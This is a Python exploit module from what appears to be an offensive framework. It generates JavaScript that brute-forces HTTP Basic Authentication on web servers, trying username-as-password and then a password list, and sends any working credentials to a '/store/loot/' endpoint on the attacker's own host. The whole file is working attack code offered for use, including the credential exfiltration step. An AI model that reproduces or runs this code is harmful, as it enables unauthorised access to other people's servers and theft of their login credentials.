#!/usr/bin/env python3
# This Source Code Form is subject to the terms of the Mozilla Public
# License, v. 2.0. If a copy of the MPL was not distributed with this
# file, You can obtain one at http://mozilla.org/MPL/2.0/.


from lib.module.exploit import ExploitClass
from lib.module import payload
from lib.module.safety import Safety
from lib.module.intrusiveness import Intrusiveness

class ExploitModule(ExploitClass):
    def __init__(self):
        super().__init__(**{
            'Name': 'Basic Authentication Brute Force',
            'Description': "Perform brute force detection of username and passwords.",
            'Options': ["LIST_USERNAMES", "LIST_PASSES"],
            'Store': ["USERNAME", "USERPASS"],
            'Ports': [80, 8080, 8888],
            'RedoServiceDetection': True,
            'classification': (Safety.SAFE, Intrusiveness.BRUTE_FORCE),
            'products':[
                {"product":"Generic Web Server Unauthorized Basic"}
            ]
        })

    def exploit_code(self, payload):
        code = """
var usernames = ${LIST_USERNAMES};
var passes = ${LIST_PASSWORDS};
var received = 0;
var status = 0;
var result = "failed";
function receive_response(xhr, method, resource, data, user, pass)   {
    received++;
    if(xhr.status == 200)   {
        var json = JSON.stringify({"USERNAME":user, "PASSWORD": pass});
        Network.request("POST", "${HOME}" + "/store/loot/" + document.domain, json, console.log);
        status = 1;    // Done after finding one password
        result = "success"
    }
    if((status == 0) && (received >= (usernames.length * (passes.length+1))))   {
        status = 1;
    }
    if(status == 1)   {
        Network.request("POST",
            "${HOME}" + "/module/finished/" + document.domain + "/${MODID}/" + result,
            null, console.log);
        status = 2;
    }
}
for(var i = 0; i < usernames.length; i++)   {
    // Try with username as password first
    Network.request_advanced("GET", "/", null, receive_response, null, null, usernames[i], usernames[i]);
    for(var j = 0; j < passes.length; j++)   {
        if(status == 0)   {
            Network.request_advanced("GET", "/", null, receive_response, null, null, usernames[i], passes[j]);
        }
    }
}"""
        return code
